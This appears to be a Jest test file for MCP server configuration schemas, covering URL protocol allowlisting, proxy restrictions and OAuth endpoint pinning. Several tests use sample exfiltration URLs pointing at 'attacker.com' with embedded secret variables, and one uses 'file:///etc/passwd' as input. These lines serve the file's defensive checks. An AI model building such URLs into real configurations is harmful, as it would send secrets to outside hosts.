import {
  MCPOptionsSchema,
  SSEOptionsSchema,
  StreamableHTTPOptionsSchema,
  MCPServerUserInputSchema,
} from '../src/mcp';

describe('MCP schemas', () => {
  describe('env variable exfiltration prevention', () => {
    it('should confirm admin schema resolves env vars (attack vector baseline)', () => {
      process.env.FAKE_SECRET = 'leaked-secret-value';
      const adminResult = SSEOptionsSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(adminResult.success).toBe(true);
      if (adminResult.success) {
        expect(adminResult.data.url).toContain('leaked-secret-value');
      }
      delete process.env.FAKE_SECRET;
    });

    it('should reject the same URL through user input schema', () => {
      process.env.FAKE_SECRET = 'leaked-secret-value';
      const userResult = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(userResult.success).toBe(false);
      delete process.env.FAKE_SECRET;
    });
  });

  describe('env variable rejection', () => {
    it('should reject SSE URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(result.success).toBe(false);
    });

    it('should reject streamable-http URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'http://attacker.com/?jwt=${JWT_SECRET}',
      });
      expect(result.success).toBe(false);
    });

    it('should reject WebSocket URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'ws://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('proxy field restrictions', () => {
    it('should accept admin-configured proxies for SSE', () => {
      const result = SSEOptionsSchema.safeParse({
        type: 'sse',
        url: 'https://mcp-server.com/sse',
        proxy: 'http://proxy.example.com:8080',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.proxy).toBe('http://proxy.example.com:8080');
      }
    });

    it('should accept admin-configured proxies for streamable-http', () => {
      const result = StreamableHTTPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        proxy: 'http://proxy.example.com:8080',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.proxy).toBe('http://proxy.example.com:8080');
      }
    });

    it('should reject unsupported proxy protocols', () => {
      const result = StreamableHTTPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        proxy: 'ftp://proxy.example.com',
      });
      expect(result.success).toBe(false);
    });

    it('should reject SSE proxy configuration from user input', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'https://mcp-server.com/sse',
        proxy: 'http://proxy.example.com:8080',
      });
      expect(result.success).toBe(false);
    });

    it('should reject streamable-http proxy configuration from user input', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        proxy: 'http://proxy.example.com:8080',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('protocol allowlisting', () => {
    it('should reject file:// URLs for SSE', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'file:///etc/passwd',
      });
      expect(result.success).toBe(false);
    });

    it('should reject ftp:// URLs for streamable-http', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'ftp://internal-server/data',
      });
      expect(result.success).toBe(false);
    });

    it('should reject http:// URLs for WebSocket', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'http://example.com/ws',
      });
      expect(result.success).toBe(false);
    });

    it('should reject ws:// URLs for SSE', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'ws://example.com/sse',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('valid URL acceptance', () => {
    it('should accept valid https:// SSE URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'https://mcp-server.com/sse',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('https://mcp-server.com/sse');
      }
    });

    it('should accept valid http:// SSE URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://mcp-server.com/sse',
      });
      expect(result.success).toBe(true);
    });

    it('should accept valid wss:// WebSocket URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'wss://mcp-server.com/ws',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('wss://mcp-server.com/ws');
      }
    });

    it('should accept valid ws:// WebSocket URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'ws://mcp-server.com/ws',
      });
      expect(result.success).toBe(true);
    });

    it('should accept valid https:// streamable-http URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('https://mcp-server.com/http');
      }
    });

    it('should accept valid http:// streamable-http URLs with "http" alias', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'http',
        url: 'http://mcp-server.com/mcp',
      });
      expect(result.success).toBe(true);
    });
  });

  describe('OAuth confidential client endpoint pinning', () => {
    it('should reject client_secret without client_id', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          authorization_url: 'https://auth.example.com/authorize',
          token_url: 'https://auth.example.com/token',
          client_secret: 'client-secret',
        },
      });

      expect(result.success).toBe(false);
    });

    it('should reject client_secret with client_id when authorization_url is missing', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          token_url: 'https://auth.example.com/token',
          client_id: 'client-id',
          client_secret: 'client-secret',
        },
      });

      expect(result.success).toBe(false);
    });

    it('should reject client_secret with client_id when token_url is missing', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          authorization_url: 'https://auth.example.com/authorize',
          client_id: 'client-id',
          client_secret: 'client-secret',
        },
      });

      expect(result.success).toBe(false);
    });

    it('should accept client_id without client_secret for auto-discovery', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          client_id: 'public-client-id',
        },
      });

      expect(result.success).toBe(true);
    });

    it('should accept client_secret when both OAuth endpoints are pinned', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          authorization_url: 'https://auth.example.com/authorize',
          token_url: 'https://auth.example.com/token',
          client_id: 'client-id',
          client_secret: 'client-secret',
        },
      });

      expect(result.success).toBe(true);
    });

    it('should accept audience parameter (Auth0/Cognito-style)', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          audience: 'https://api.example.com',
        },
      });

      expect(result.success).toBe(true);
      if (result.success && result.data.oauth) {
        expect(result.data.oauth.audience).toBe('https://api.example.com');
      }
    });

    it('should accept audience alongside scope and other OAuth fields', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          authorization_url: 'https://auth.example.com/authorize',
          token_url: 'https://auth.example.com/token',
          scope: 'read execute',
          audience: 'https://api.example.com',
        },
      });

      expect(result.success).toBe(true);
    });

    it('should treat audience as optional (omitting it is fine)', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          scope: 'read',
        },
      });

      expect(result.success).toBe(true);
      if (result.success && result.data.oauth) {
        expect(result.data.oauth.audience).toBeUndefined();
      }
    });

    it('should reject empty-string audience', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          audience: '',
        },
      });

      expect(result.success).toBe(false);
    });

    it('should accept forward_audience_on_refresh = false (Cognito opt-out)', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          audience: 'https://api.example.com',
          forward_audience_on_refresh: false,
        },
      });

      expect(result.success).toBe(true);
      if (result.success && result.data.oauth) {
        expect(result.data.oauth.forward_audience_on_refresh).toBe(false);
      }
    });

    it('should treat forward_audience_on_refresh as optional', () => {
      const result = MCPOptionsSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
        oauth: {
          audience: 'https://api.example.com',
        },
      });

      expect(result.success).toBe(true);
      if (result.success && result.data.oauth) {
        expect(result.data.oauth.forward_audience_on_refresh).toBeUndefined();
      }
    });
  });
});
